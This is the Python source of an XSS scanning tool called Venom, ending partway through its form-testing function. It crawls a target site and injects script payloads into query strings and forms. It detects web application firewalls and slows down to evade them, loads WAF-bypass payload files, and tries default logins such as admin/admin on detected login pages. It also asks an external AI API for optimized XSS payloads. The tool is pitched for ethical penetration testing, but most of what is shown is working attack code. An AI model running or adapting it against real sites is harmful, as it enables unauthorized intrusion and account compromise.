#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException, SSLError, Timeout
from concurrent.futures import ThreadPoolExecutor
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity

# Setup logging
log_file = "venom.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_file, mode='a', encoding='utf-8'), logging.StreamHandler()]
)
logging.info("Logging initialized successfully")

# Colors
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
ORANGE, BLUE, PURPLE, CYAN = '\033[38;5;208m', '\033[94m', '\033[95m', '\033[96m'

class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def parse_post_file(file_path: str) -> tuple[Optional[str], Dict[str, str], Dict[str, str]]:
    url = None
    headers = {}
    data = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            lines = content.splitlines()
            
            if lines and lines[0].startswith("POST "):
                url_parts = lines[0].split()
                if len(url_parts) >= 2:
                    url = url_parts[1]
            
            in_headers = True
            body_start = 0
            for i, line in enumerate(lines[1:], 1):
                if not line.strip():
                    in_headers = False
                    body_start = i + 1
                    break
                if in_headers and ':' in line:
                    key, value = line.split(':', 1)
                    headers[sanitize_input(key.strip())] = sanitize_input(value.strip())
            
            if not url and 'Host' in headers:
                url = f"http://{headers['Host']}{url or '/'}"
            
            if body_start > 0 and body_start < len(lines):
                body = '&'.join(lines[body_start:]).strip()
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[sanitize_input(key)] = sanitize_input(value)
            
            logging.info(f"Parsed POST file: URL={url}, Headers={headers}, Data={data}")
            return url, headers, data
    except Exception as e:
        logging.error(f"Failed to parse POST file {file_path}: {e}")
        return None, {}, {}
    return url, headers, data

def get_banner_and_features() -> str:
    banner = f"""
{BLUE}╔════════════════════════════════════════════════════════════════════╗{RESET}
{BLUE}║{RESET}          {CYAN}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║█████╗  ██╔██╗ ██║██║   ██╗██╔████╔██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔══╝  ██║╚██╗██║██║   ██╗██║╚██╔╝██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}           {CYAN}╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}                                                                    {BLUE}║{RESET}
{BLUE}║{RESET}                  {PURPLE}Venom Advanced XSS Scanner 2025{RESET}                   {BLUE}║{RESET}
{BLUE}║{RESET}                            {WHITE}Version 5.20{RESET}                            {BLUE}║{RESET}
{BLUE}║{RESET}    {GREEN}Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER{RESET}    {BLUE}║{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        "Accurate XSS detection with context-aware analysis",
        "Smart session-aware POST/GET scanning with login support",
        "Support for custom POST requests from TXT files",
        "Dynamic response analysis with similarity checking",
        "WAF/CSP detection with adaptive strategies",
        "Payloads sourced from local files and GitHub",
        "AI-driven payload optimization with model selection"
    ]
    return banner + "\n".join(f"{GREEN}{BOLD}●{RESET} {BOLD}{feature}{RESET}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional-grade tool for ethical penetration testers to identify XSS vulnerabilities with high accuracy. This version supports HTTP/HTTPS, smart POST/GET requests, custom POST from TXT files, session management, and AI model selection.

Usage:
  python3 venom.py <url> [options]
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan", nargs='?')
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization")
    parser.add_argument("--ai-key", type=str, default=None, help="API key for AI assistance")
    parser.add_argument("--ai-model", type=str, default="xai-grok", help="AI model to use")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required)", required=True)
    parser.add_argument("--payloads-dir", default="./payloads/", help="Directory with custom payload files")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging")
    parser.add_argument("--stealth", action="store_true", help="Force stealth mode", default=False)
    parser.add_argument("--min-delay", type=float, help="Min delay between tests in seconds")
    parser.add_argument("--max-delay", type=float, help="Max delay between tests in seconds")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in report")
    parser.add_argument("-H", action='append', help="Custom HTTP headers (e.g., 'Cookie: session=abc')", default=[])
    parser.add_argument("--method", choices=['get', 'post', 'both'], default='both', help="HTTP method to use")
    parser.add_argument("--data", type=str, default=None, help="Data for POST request (e.g., 'key1=value1&key2=value2')")
    parser.add_argument("--post-file", type=str, default=None, help="Path to TXT file containing a POST request")
    parser.add_argument("--payload-field", type=str, default=None, help="Field to inject payload into")
    parser.add_argument("--login-url", type=str, default=None, help="URL for login to establish session")
    parser.add_argument("--login-data", type=str, default=None, help="Login credentials for POST (e.g., 'username=admin&password=admin')")
    parser.add_argument("--auto-login", action="store_true", help="Automatically detect and attempt login", default=False)

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode forced: Workers limited to {args.workers}, Delays: {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.1
        args.max_delay = args.max_delay if args.max_delay is not None else 0.5
    
    if args.post_file:
        post_url, post_headers, post_data = parse_post_file(sanitize_path(args.post_file))
        if post_url and not args.url:
            args.url = post_url
        elif post_url and args.url and post_url != args.url:
            print(f"{YELLOW}[!] URL from --post-file ({post_url}) differs from command-line URL ({args.url}). Using command-line URL.{RESET}")
        if not args.url:
            print(f"{RED}[!] No URL provided and none found in --post-file. Exiting.{RESET}")
            sys.exit(1)
        args.post_headers = post_headers
        args.post_data = post_data if not args.data else args.data
        if post_headers:
            args.H.extend([f"{k}: {v}" for k, v in post_headers.items()])
        print(f"{GREEN}[+] Loaded POST request from file: {args.post_file}{RESET}")
    
    if not args.url:
        print(f"{RED}[!] URL is required unless provided via --post-file. Exiting.{RESET}")
        sys.exit(1)
    
    if args.ai_assist and not args.ai_key:
        print(f"{YELLOW}[!] Warning: --ai-assist enabled without --ai-key. Using default payload enhancement.{RESET}")
    if args.method == 'post' and not args.data and not args.post_file and not args.auto_login:
        print(f"{YELLOW}[!] Warning: POST method selected without --data, --post-file, or --auto-login. No data will be sent unless forms are detected.{RESET}")
    if args.login_url and not args.login_data:
        print(f"{RED}[!] Error: --login-url provided without --login-data. Exiting.{RESET}")
        sys.exit(1)
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command executed: {command}{RESET}")
    return args

def fetch_payloads_from_github(urls: List[str], timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.20'}
    session = requests.Session()
    session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2)))
    
    github_urls = [
        "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/xss-payloads.txt",
    ]
    
    for url in github_urls:
        try:
            response = session.get(url, headers=headers, timeout=timeout, verify=True)
            response.raise_for_status()
            content = response.text
            payloads.extend([sanitize_input(p.strip()) for p in content.splitlines() if p.strip() and '<' in p])
            logging.info(f"Fetched {len(payloads)} payloads from {url}")
            break
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
            continue
    
    if not payloads:
        logging.warning("No payloads fetched from GitHub; relying on local payloads only.")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<script>console.log('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
            "<body onload=alert('XSS')>",
            "\"><script>alert(1)</script>",
            "javascript:alert('XSS')"
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.warning(f"Payloads directory {self.payloads_dir} not found; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        category_map = {
            'waf_bypass': 'waf_bypass.txt',
            '403bypass': '403bypass.txt',
            'default': ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt']
        }

        selected_category = 'waf_bypass' if self.bypass_needed else '403bypass' if self.use_403_bypass else 'default'
        all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
        if not all_files:
            logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        if selected_category == 'default':
            for filename in category_map['default']:
                file_path = os.path.join(self.payloads_dir, filename)
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded default payloads from {file_path}")
        else:
            file_path = os.path.join(self.payloads_dir, category_map[selected_category])
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded {selected_category} payloads from {file_path}")
            else:
                logging.warning(f"No {selected_category} file found; falling back to all .txt files.")
                for filename in all_files:
                    file_path = os.path.join(self.payloads_dir, filename)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded payloads from {file_path}")

        if not self.stealth:
            github_payloads = fetch_payloads_from_github([], 15)
            payloads.extend(github_payloads)

        if not payloads:
            payloads = stealth_payloads if self.stealth else default_payloads
        
        logging.info(f"Loaded {len(payloads)} total payloads (local + GitHub)")
        return list(set(payloads))

    def optimize_payloads(self, response_text: str, active_params: List[str]) -> List[str]:
        html_context = '<input' in response_text or '<form' in response_text or '<body' in response_text
        js_context = '<script' in response_text or 'javascript:' in response_text
        optimized = []
        for payload in self.payloads:
            if len(payload) > 100 and not self.stealth:
                continue
            if html_context and ('on' in payload.lower() or 'src=' in payload.lower() or '>' in payload or 'background' in payload.lower()):
                optimized.append(payload)
            elif js_context and ('alert(' in payload.lower() or 'console.log(' in payload.lower() or 'javascript:' in payload.lower()):
                optimized.append(payload)
            elif '<script' in payload or '<iframe' in payload or '<meta' in payload:
                optimized.append(payload)
        return optimized if optimized else self.payloads

    def generate(self) -> List[str]:
        return self.payloads

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, model: str = "xai-grok"):
        self.payloads = payloads
        self.api_key = api_key
        self.model = model
        self.api_endpoint = self.get_api_endpoint()
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with model: {self.model}, endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance disabled (no API key or invalid model). Using default enhancement.")

    def get_api_endpoint(self) -> Optional[str]:
        endpoints = {
            "xai-grok": "https://api.xai.com/v1/completions",
            "openai-gpt3": "https://api.openai.com/v1/completions"
        }
        return endpoints.get(self.model, None)

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if 'alert(' in p.lower() or 'on' in p.lower() or 'javascript:' in p.lower()]
        other_payloads = [p for p in self.payloads if p not in executable_payloads]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
            logging.info("Prioritizing shorter payloads due to timeouts or 404s.")
        
        if initial_run or not self.success_history:
            if self.api_key and self.api_endpoint and response:
                ai_suggestions = self.get_ai_suggestions(response)
                executable_payloads.extend(ai_suggestions)
                logging.info(f"AI-enhanced payload set generated with {self.model}: {len(ai_suggestions)} additional payloads.")
            return list(set(executable_payloads + other_payloads[:20]))
        
        if response and self.api_key and self.api_endpoint:
            context = 'html' if '<' in response else 'js' if 'script' in response.lower() else 'unknown'
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"],
                    reverse=True
                )
            ai_suggestions = self.get_ai_suggestions(response)
            sorted_payloads.extend(ai_suggestions)
            sorted_payloads.extend(other_payloads[:20])
            return list(set(sorted_payloads))
        
        return list(set(executable_payloads + other_payloads[:20]))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            data = {
                "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                "max_tokens": 50,
                "model": "grok" if self.model == "xai-grok" else "text-davinci-003"
            }
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10, verify=True)
            ai_response.raise_for_status()
            suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except (RequestException, ValueError) as e:
            logging.error(f"AI API call failed for {self.model}: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        # Enhanced header handling
        self.update_headers(args.H)

        self.post_data = {}
        if args.post_file and hasattr(args, 'post_data'):
            self.post_data = args.post_data
        elif args.data:
            for pair in args.data.split('&'):
                try:
                    key, value = pair.split('=', 1)
                    self.post_data[key] = value
                except ValueError:
                    logging.warning(f"Invalid POST data format: {pair}")

        if args.login_url and args.login_data:
            self.establish_session(args.login_url, args.login_data)

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.start_time = time.time()
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_csp_status = "Unknown"
        self.bypass_performed = False
        self.use_403_bypass = False
        self.is_waf_detected = False
        self.active_params = []

        self.initial_waf_csp_check()
        if not self.args.stealth and self.is_waf_detected:
            self.args.min_delay = 5
            self.args.max_delay = 15
            self.args.workers = min(self.args.workers, 2)
            print(f"{YELLOW}[!] WAF detected. Enabling stealth mode: Delays {self.args.min_delay}-{self.args.max_delay}s, Workers: {self.args.workers}{RESET}")
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth or self.is_waf_detected)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_model) if self.args.ai_assist else None
        print(f"{GREEN}[+] AI Assistance: {'Enabled' if self.ai_assistant and self.args.ai_key else 'Disabled'}{RESET}")

    def update_headers(self, headers: List[str]) -> None:
        """Update session headers dynamically with validation."""
        for header in headers:
            try:
                key, value = header.split(':', 1)
                sanitized_key = sanitize_input(key.strip())
                sanitized_value = sanitize_input(value.strip())
                self.session.headers.update({sanitized_key: sanitized_value})
                logging.info(f"Added header: {sanitized_key}: {sanitized_value}")
                print(f"{GREEN}[+] Added header: {CYAN}{sanitized_key}: {WHITE}{sanitized_value}{RESET}")
            except ValueError:
                logging.warning(f"Invalid header format: {header}")
                print(f"{YELLOW}[!] Invalid header format: {header}{RESET}")

    def establish_session(self, login_url: str, login_data: str) -> bool:
        """Establish a session with the provided login URL and data."""
        login_dict = {}
        for pair in login_data.split('&'):
            try:
                key, value = pair.split('=', 1)
                login_dict[key] = value
            except ValueError:
                logging.warning(f"Invalid login data format: {pair}")
        try:
            login_response = self.session.post(login_url, data=login_dict, timeout=self.args.timeout, verify=True)
            if login_response.status_code in [200, 302]:
                logging.info(f"Login successful to {login_url}")
                print(f"{GREEN}[+] Session established successfully at {CYAN}{login_url}{RESET}")
                return True
            else:
                logging.warning(f"Login failed to {login_url} (Status: {login_response.status_code})")
                print(f"{YELLOW}[!] Session establishment failed: Status {login_response.status_code}{RESET}")
                return False
        except RequestException as e:
            logging.error(f"Login attempt failed: {e}")
            print(f"{RED}[!] Session establishment failed: {e}{RESET}")
            return False

    def smart_session_management(self, url: str, soup: BeautifulSoup) -> bool:
        """Smartly manage sessions by detecting login pages and establishing new sessions if needed."""
        login_url = self.detect_login_page(url, soup)
        if not login_url:
            logging.info("No login page detected; using existing session.")
            return True if self.session.cookies else False

        # Check if current session is valid
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            if "login" in response.url.lower() or response.status_code == 401:
                logging.info("Current session invalid or expired; attempting to establish new session.")
                print(f"{YELLOW}[!] Current session invalid or expired; attempting new session.{RESET}")
            else:
                return True
        except RequestException:
            pass

        # Extract form fields dynamically
        form = soup.find('form')
        if not form:
            return False
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
        username_field = next((k for k in inputs if 'user' in k.lower() or 'email' in k.lower()), None)
        password_field = next((k for k in inputs if 'pass' in k.lower()), None)

        if not (username_field and password_field):
            logging.warning("Could not identify login fields.")
            print(f"{YELLOW}[!] Could not identify login fields.{RESET}")
            return False

        # Use provided credentials or default ones
        if self.args.login_data:
            credentials = self.args.login_data
        else:
            credentials = "username=admin&password=admin"  # Default fallback
            print(f"{YELLOW}[!] No login data provided; using default credentials: admin/admin{RESET}")

        success = self.establish_session(login_url, credentials)
        if success and self.args.H:
            self.update_headers(self.args.H)  # Re-apply headers after session establishment
        return success

    def initial_waf_csp_check(self) -> None:
        try:
            response = self.session.get(self.args.url, timeout=self.args.timeout, verify=True)
            headers = response.headers
            waf_indicators = {'cloudflare': 'cf-ray', 'akamai': 'akamai', 'sucuri': 'sucuri', 'mod_security': 'mod_security'}
            csp = headers.get('Content-Security-Policy', '')
            for tech, indicator in waf_indicators.items():
                if indicator.lower() in str(headers).lower():
                    self.waf_csp_status = f"WAF detected ({tech})"
                    self.is_waf_detected = True
                    logging.info(f"Initial check: WAF detected: {tech}")
                    break
            if not self.is_waf_detected and csp:
                self.waf_csp_status = "CSP detected"
                self.is_waf_detected = True
                logging.info("Initial check: CSP detected")
            if not self.is_waf_detected:
                self.waf_csp_status = "No WAF/CSP detected"
                logging.info("Initial check: No WAF/CSP detected")
        except RequestException as e:
            logging.error(f"Initial WAF/CSP check failed: {e}")
            self.waf_csp_status = "Check failed"

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.args.timeout, allow_redirects=True, verify=True)
            logging.info(f"Connection check for {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            return response.status_code < 400 or response.status_code in [403, 404]
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Connection check failed for {url}: {e}")
            return False

    def identify_active_params(self, url: str, soup: BeautifulSoup, method: str = 'get') -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        additional_params = ['q', 'search', 'query', 'id', 'page', 'username', 'password', 'login', 'user', 'pass', 'email']
        for param in additional_params:
            if param not in param_keys:
                param_keys.append(param)
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and name not in param_keys:
                param_keys.append(name)
        if self.post_data and method == 'post':
            param_keys.extend(self.post_data.keys())
        
        active_params = []
        try:
            base_response = self.session.request(method, url, data=self.post_data if method == 'post' else None, 
                                               timeout=self.args.timeout, verify=True).text
            base_length = len(base_response)
            base_hash = hash(base_response)
            
            for param in param_keys:
                test_params = {param: "test"}
                test_url = f"{url.split('?', 1)[0]}?{urlencode(test_params)}" if method == 'get' else url
                response = self.session.request(
                    method, test_url,
                    params=test_params if method == 'get' else None,
                    data=test_params if method == 'post' else self.post_data,
                    timeout=self.args.timeout,
                    verify=True
                ).text
                if len(response) != base_length or hash(response) != base_hash:
                    active_params.append(param)
        except RequestException as e:
            logging.error(f"Parameter identification failed: {e}")
        
        return active_params if active_params else param_keys[:5]

    def detect_login_page(self, url: str, soup: BeautifulSoup) -> Optional[str]:
        login_keywords = ['login', 'signin', 'log-in', 'sign-in', 'auth', 'authenticate']
        if any(keyword in url.lower() for keyword in login_keywords):
            return url
        for form in soup.find_all('form'):
            inputs = form.find_all('input')
            has_username = any('username' in inp.get('name', '').lower() or 'user' in inp.get('name', '').lower() for inp in inputs)
            has_password = any('password' in inp.get('name', '').lower() or 'pass' in inp.get('name', '').lower() for inp in inputs)
            if has_username and has_password:
                action = form.get('action', '')
                return urljoin(url, action) if action else url
        return None

    def auto_login(self, login_url: str) -> bool:
        default_creds = [
            {"username": "admin", "password": "admin"},
            {"username": "user", "password": "password"},
            {"username": "test", "password": "test123"}
        ]
        for creds in default_creds:
            try:
                response = self.session.post(login_url, data=creds, timeout=self.args.timeout, verify=True)
                if response.status_code in [200, 302] and "login" not in response.url.lower():
                    logging.info(f"Auto-login successful to {login_url} with {creds}")
                    print(f"{GREEN}[+] Auto-login successful to {CYAN}{login_url}{RESET} with {creds}")
                    return True
            except RequestException as e:
                logging.error(f"Auto-login attempt failed for {login_url}: {e}")
        logging.warning(f"Auto-login failed for {login_url} with default credentials")
        print(f"{YELLOW}[!] Auto-login failed for {login_url}{RESET}")
        return False

    def calculate_total_tests(self, url: str, soup: BeautifulSoup) -> int:
        self.active_params = self.identify_active_params(url, soup, 'get')
        form_params = sum(len(form.find_all(['input', 'textarea', 'select'])) for form in soup.find_all('form'))
        methods = 2 if self.args.method == 'both' else 1
        return len(self.payloads) * max(len(self.active_params) + form_params, 1) * methods

    def scan(self) -> None:
        logging.info(f"Starting scan on {self.args.url}")
        print(f"{BLUE}════════════════════════════════════════════════════{RESET}")
        print(f"{GREEN}[+] Initiating XSS Scan on {CYAN}{self.args.url}{RESET}")
        print(f"{BLUE}════════════════════════════════════════════════════{RESET}")
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] Scan aborted: Target URL is not suitable.{RESET}")
            self.report()
            return
        self.crawl(self.args.url)
        
        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            while not self.task_queue.empty() and self.running:
                try:
                    task = self.task_queue.get(timeout=15)
                    executor.submit(task)
                    self.task_queue.task_done()
                    delay = random.uniform(self.args.min_delay, self.args.max_delay)
                    time.sleep(delay)
                except queue.Empty:
                    break
                except Exception as e:
                    logging.error(f"Thread execution failed: {e}")
        
        self.running = False
        self._display_status()
        print("\n")
        self.report()

    def crawl(self, url: str, depth: int = 0, max_depth: int = 3) -> None:
        with self.lock:
            if url in self.visited_urls or depth > max_depth or urlparse(url).netloc != self.domain:
                return
            self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Smart session management
            if not self.smart_session_management(url, soup):
                if self.args.auto_login:
                    login_url = self.detect_login_page(url, soup)
                    if login_url:
                        self.auto_login(login_url)
            
            if response.status_code == 403 and not self.use_403_bypass:
                self.use_403_bypass = True
                self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, True)
                self.payloads = self.payload_generator.generate()
                self.total_payloads = len(self.payloads)
                self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_model) if self.args.ai_assist else None
            
            logging.info(f"Crawled {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            with self.lock:
                self.total_payloads += self.calculate_total_tests(url, soup) - len(self.payloads)
            payloads = self.payload_generator.optimize_payloads(response.text, self.active_params)
            if self.ai_assistant:
                payloads = self.ai_assistant.suggest_payloads(response.text, initial_run=(depth == 0), status_code=response.status_code)
            payloads = payloads[:100] if not self.args.full_report else payloads
            
            if response.status_code == 404 and len(self.visited_urls) == 1:
                logging.warning(f"Initial URL {url} returned 404. Attempting fallback paths.")
                common_paths = ['/', '/index.php', '/login', '/search']
                for path in common_paths:
                    new_url = urljoin(url, path)
                    if new_url not in self.visited_urls and urlparse(new_url).netloc == self.domain:
                        self.task_queue.put(lambda u=new_url: self.crawl(u, depth + 1, max_depth))
                return
            
            if self.args.method in ['get', 'both']:
                self.test_injection_points(url, response, soup, payloads, 'get')
            if self.args.method in ['post', 'both']:
                if soup.find_all('form') or self.post_data:
                    self.test_injection_points(url, response, soup, payloads, 'post')
            
            for form in soup.find_all('form'):
                action = urljoin(url, form.get('action', ''))
                if urlparse(action).netloc == self.domain:
                    self.task_queue.put(lambda f=form, a=action, p=payloads: self.test_form(a, f, p))
            
            if self.args.auto_login:
                login_url = self.detect_login_page(url, soup)
                if login_url and login_url not in self.visited_urls:
                    if self.auto_login(login_url):
                        self.task_queue.put(lambda u=login_url: self.crawl(u, depth + 1, max_depth))
            
            common_paths = ['/', '/search', '/index.php', '/login']
            for path in common_paths:
                new_url = urljoin(url, path)
                with self.lock:
                    if new_url not in self.visited_urls and urlparse(new_url).netloc == self.domain:
                        self.task_queue.put(lambda u=new_url: self.crawl(u, depth + 1, max_depth))
        except RequestException as e:
            logging.error(f"Crawl failed for {url}: {e}")

    def test_injection_points(self, url: str, response: requests.Response, soup: BeautifulSoup, payloads: List[str], method: str) -> None:
        active_params = self.identify_active_params(url, soup, method)
        logging.info(f"Testing injection points with params: {active_params} on {url} using {method.upper()}")
        print(f"{BLUE}[*] Testing {method.upper()} on {CYAN}{url}{RESET} with {len(active_params)} params and {len(payloads)} payloads")
        base_url = url.split('?', 1)[0]
        base_response = response.text
        base_length = len(base_response)
        base_hash = hash(base_response)
        
        for payload in payloads:
            self.current_payload = payload
            self.total_tests.increment()
            for param in active_params:
                test_params = {param: payload}
                self.task_queue.put(lambda p=param, tp=test_params, pl=payload, m=method, br=base_response, bl=base_length, bh=base_hash: 
                    self.test_request(base_url, tp, pl, m, injection_point=f"Query String ({p})", base_response=br, base_length=bl, base_hash=bh))
        
        logging.info(f"{method.upper()} testing completed with {len(active_params)} params and {len(payloads)} payloads")
        print(f"{GREEN}[+] {method.upper()} testing completed{RESET}")

    def test_form(self, action: str, form: BeautifulSoup, payloads: List[str]) -> None:
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')}
        if not inputs:
            inputs = {tag.get('id') or f"unnamed_{i}": '' for i, tag in enumerate(form.find_all(['input', 'textarea', 'select']))}
        if self.post_data:
            inputs.update(self.post_data)
